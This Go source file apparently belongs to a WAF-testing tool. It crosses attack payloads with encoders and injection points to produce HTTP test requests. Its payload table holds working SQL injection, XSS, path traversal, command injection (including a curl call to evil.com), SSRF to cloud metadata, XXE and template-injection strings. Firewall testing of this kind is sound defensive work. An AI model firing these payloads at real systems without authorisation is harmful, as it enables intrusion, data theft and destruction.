// Package evasionmatrix provides combinatorial test generation using
// Encoder × Placeholder × Payload matrices for comprehensive WAF testing.
package evasionmatrix

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/http"
	"sync"

	"github.com/waftester/waftester/pkg/encoding"
	"github.com/waftester/waftester/pkg/placeholders"
)

// Test represents a single test case in the matrix
type Test struct {
	ID              string // Unique test identifier
	Payload         string // Original payload
	EncoderName     string // Encoder used
	PlaceholderName string // Placeholder used
	EncodedPayload  string // Payload after encoding
	Category        string // Attack category (sqli, xss, etc.)
}

// ExecutableTest extends Test with request generation capability
type ExecutableTest struct {
	Test
	TargetURL string
	Config    *placeholders.PlaceholderConfig
}

// ToRequest generates an HTTP request for this test using the given context.
func (t *ExecutableTest) ToRequest(ctx context.Context) (*http.Request, error) {
	p := placeholders.Get(t.PlaceholderName)
	if p == nil {
		return nil, fmt.Errorf("placeholder not found: %s", t.PlaceholderName)
	}
	return p.Apply(ctx, t.TargetURL, t.EncodedPayload, t.Config)
}

// Matrix holds the combinatorial test configuration
type Matrix struct {
	payloads     []string
	encoderNames []string
	phNames      []string
	categories   []string
	tests        []Test
	built        bool
	mu           sync.RWMutex
}

// Builder for creating matrices
type Builder struct {
	matrix *Matrix
}

// New creates a new matrix builder
func New() *Builder {
	return &Builder{
		matrix: &Matrix{
			payloads:     []string{},
			encoderNames: []string{},
			phNames:      []string{},
			categories:   []string{},
		},
	}
}

// Payloads adds payloads to the matrix
func (b *Builder) Payloads(payloads ...string) *Builder {
	b.matrix.payloads = append(b.matrix.payloads, payloads...)
	return b
}

// Encoders adds encoder names to the matrix
func (b *Builder) Encoders(encoders ...string) *Builder {
	b.matrix.encoderNames = append(b.matrix.encoderNames, encoders...)
	return b
}

// Placeholders adds placeholder names to the matrix
func (b *Builder) Placeholders(phs ...string) *Builder {
	b.matrix.phNames = append(b.matrix.phNames, phs...)
	return b
}

// Categories sets attack categories
func (b *Builder) Categories(cats ...string) *Builder {
	b.matrix.categories = append(b.matrix.categories, cats...)
	return b
}

// AllEncoders adds all registered encoders
func (b *Builder) AllEncoders() *Builder {
	b.matrix.encoderNames = append(b.matrix.encoderNames, encoding.List()...)
	return b
}

// AllPlaceholders adds all registered placeholders
func (b *Builder) AllPlaceholders() *Builder {
	b.matrix.phNames = append(b.matrix.phNames, placeholders.List()...)
	return b
}

// Build generates all test combinations
func (b *Builder) Build() *Matrix {
	b.matrix.mu.Lock()
	defer b.matrix.mu.Unlock()

	// Default encoders if none specified
	if len(b.matrix.encoderNames) == 0 {
		b.matrix.encoderNames = []string{"plain"}
	}

	// Default placeholders if none specified
	if len(b.matrix.phNames) == 0 {
		b.matrix.phNames = []string{"url-param"}
	}

	// Generate all combinations
	capacity := len(b.matrix.payloads) * len(b.matrix.encoderNames) * len(b.matrix.phNames)
	b.matrix.tests = make([]Test, 0, capacity)

	for _, payload := range b.matrix.payloads {
		for _, encName := range b.matrix.encoderNames {
			for _, phName := range b.matrix.phNames {
				// Encode the payload
				encodedPayload := payload
				if enc := encoding.Get(encName); enc != nil {
					if encoded, err := enc.Encode(payload); err == nil {
						encodedPayload = encoded
					}
				}

				// Generate unique ID
				id := generateTestID(payload, encName, phName)

				// Determine category
				category := ""
				if len(b.matrix.categories) > 0 {
					category = b.matrix.categories[0]
				}

				test := Test{
					ID:              id,
					Payload:         payload,
					EncoderName:     encName,
					PlaceholderName: phName,
					EncodedPayload:  encodedPayload,
					Category:        category,
				}
				b.matrix.tests = append(b.matrix.tests, test)
			}
		}
	}

	b.matrix.built = true
	return b.matrix
}

// Count returns the number of tests in the matrix
func (m *Matrix) Count() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.tests)
}

// Tests returns all test cases
func (m *Matrix) Tests() []Test {
	m.mu.RLock()
	defer m.mu.RUnlock()

	// Return a copy to be safe
	tests := make([]Test, len(m.tests))
	copy(tests, m.tests)
	return tests
}

// TestsChan returns a channel for concurrent iteration
func (m *Matrix) TestsChan() <-chan Test {
	ch := make(chan Test)
	go func() {
		m.mu.RLock()
		defer m.mu.RUnlock()
		for _, test := range m.tests {
			ch <- test
		}
		close(ch)
	}()
	return ch
}

// ExecutableTests returns tests that can generate HTTP requests
func (m *Matrix) ExecutableTests(targetURL string, config *placeholders.PlaceholderConfig) []ExecutableTest {
	m.mu.RLock()
	defer m.mu.RUnlock()

	tests := make([]ExecutableTest, len(m.tests))
	for i, t := range m.tests {
		tests[i] = ExecutableTest{
			Test:      t,
			TargetURL: targetURL,
			Config:    config,
		}
	}
	return tests
}

// Filter returns a new matrix with only tests matching the filter
func (m *Matrix) Filter(fn func(Test) bool) *Matrix {
	m.mu.RLock()
	defer m.mu.RUnlock()

	filtered := &Matrix{
		tests: make([]Test, 0),
		built: true,
	}
	for _, t := range m.tests {
		if fn(t) {
			filtered.tests = append(filtered.tests, t)
		}
	}
	return filtered
}

// NewFromCategories creates a matrix with payloads from specified categories
func NewFromCategories(categories []string) *Matrix {
	builder := New()

	// Load payloads from categories
	for _, cat := range categories {
		payloads := GetCategoryPayloads(cat)
		builder.Payloads(payloads...)
	}

	builder.Categories(categories...)
	return builder.Build()
}

// GetCategoryPayloads returns payloads for a category
func GetCategoryPayloads(category string) []string {
	payloadMap := map[string][]string{
		"sqli": {
			"' OR '1'='1",
			"' OR 1=1--",
			"1' AND '1'='1",
			"'; DROP TABLE users--",
			"1 UNION SELECT NULL,NULL,NULL--",
			"1' ORDER BY 1--",
			"1' AND SLEEP(5)--",
			"' OR ''='",
			"admin'--",
			"1; SELECT * FROM users",
		},
		"xss": {
			"<script>alert(1)</script>",
			"<img src=x onerror=alert(1)>",
			"<svg onload=alert(1)>",
			"javascript:alert(1)",
			"<body onload=alert(1)>",
			"'\"><script>alert(1)</script>",
			"<iframe src=javascript:alert(1)>",
			"<div onmouseover=alert(1)>",
			"<input onfocus=alert(1) autofocus>",
			"<marquee onstart=alert(1)>",
		},
		"lfi": {
			"../../../etc/passwd",
			"....//....//....//etc/passwd",
			"/etc/passwd%00",
			"..%252f..%252f..%252fetc/passwd",
			"..\\..\\..\\windows\\win.ini",
			"....//....//etc/passwd",
			"..%c0%af..%c0%af..%c0%afetc/passwd",
			"/proc/self/environ",
			"php://filter/convert.base64-encode/resource=index.php",
			"file:///etc/passwd",
		},
		"rce": {
			"; ls -la",
			"| cat /etc/passwd",
			"`whoami`",
			"$(id)",
			"; ping -c 1 127.0.0.1",
			"&& cat /etc/passwd",
			"|| whoami",
			"`sleep 5`",
			"$(sleep 5)",
			"; curl http://evil.com",
		},
		"ssrf": {
			"http://localhost",
			"http://127.0.0.1",
			"http://169.254.169.254",
			"http://[::1]",
			"file:///etc/passwd",
			"http://0.0.0.0",
			"http://2130706433", // IP as decimal
			"http://127.1",
			"http://localhost:22",
			"gopher://localhost:6379/_",
		},
		"xxe": {
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
			`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com">]>`,
			`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>`,
		},
		"ssti": {
			"{{7*7}}",
			"${7*7}",
			"<%= 7*7 %>",
			"{{constructor.constructor('return this')()}}",
			"#{7*7}",
			"*{7*7}",
			"@(7*7)",
		},
	}

	if payloads, ok := payloadMap[category]; ok {
		return payloads
	}
	return []string{}
}

// generateTestID creates a unique ID for a test
func generateTestID(payload, encoder, placeholder string) string {
	h := sha256.New()
	h.Write([]byte(fmt.Sprintf("%s|%s|%s", payload, encoder, placeholder)))
	return hex.EncodeToString(h.Sum(nil))[:16]
}

// DefaultMatrix returns a comprehensive default matrix
func DefaultMatrix() *Matrix {
	return New().
		Payloads(
			"' OR '1'='1",
			"<script>alert(1)</script>",
			"../../../etc/passwd",
			"; ls -la",
		).
		Encoders("plain", "url", "base64", "unicode", "double-url").
		Placeholders("url-param", "header", "cookie", "body-json", "body-form").
		Build()
}

// FullMatrix returns the maximum coverage matrix
func FullMatrix() *Matrix {
	builder := New()

	// All categories
	for _, cat := range []string{"sqli", "xss", "lfi", "rce", "ssrf"} {
		builder.Payloads(GetCategoryPayloads(cat)...)
	}

	return builder.AllEncoders().AllPlaceholders().Build()
}

// Stats returns matrix statistics
type Stats struct {
	TotalTests   int
	Payloads     int
	Encoders     int
	Placeholders int
	Categories   int
}

// Stats returns statistics about the matrix
func (m *Matrix) Stats() Stats {
	m.mu.RLock()
	defer m.mu.RUnlock()

	// Count unique values
	payloads := make(map[string]bool)
	encoders := make(map[string]bool)
	phs := make(map[string]bool)
	cats := make(map[string]bool)

	for _, t := range m.tests {
		payloads[t.Payload] = true
		encoders[t.EncoderName] = true
		phs[t.PlaceholderName] = true
		if t.Category != "" {
			cats[t.Category] = true
		}
	}

	return Stats{
		TotalTests:   len(m.tests),
		Payloads:     len(payloads),
		Encoders:     len(encoders),
		Placeholders: len(phs),
		Categories:   len(cats),
	}
}
